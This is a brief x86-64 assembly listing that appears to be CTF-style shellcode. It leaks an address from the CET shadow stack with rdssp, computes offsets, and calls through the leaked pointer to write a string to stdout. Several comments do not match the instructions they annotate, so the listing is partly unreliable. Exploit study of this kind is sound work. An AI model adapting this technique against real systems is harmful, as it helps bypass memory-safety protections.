global _start

section .text
_start:
    endbr64
; load the shadow stack address into rsp
    rdssp rsp
; read the binary leak
    mov rax, rsp
; 
; add syscall offset to rax
    add sp, 0x1110
; add string offset
    add di, 0x2160
; move the string to rdx
    mov rdx, rdi
; set rdi (sysno)
    mov dil, 0x1
; set rsi (fd)
    mov sil, 0x1
; set r10 (count)
    mov r10b, 0x10
    
    call [rax]
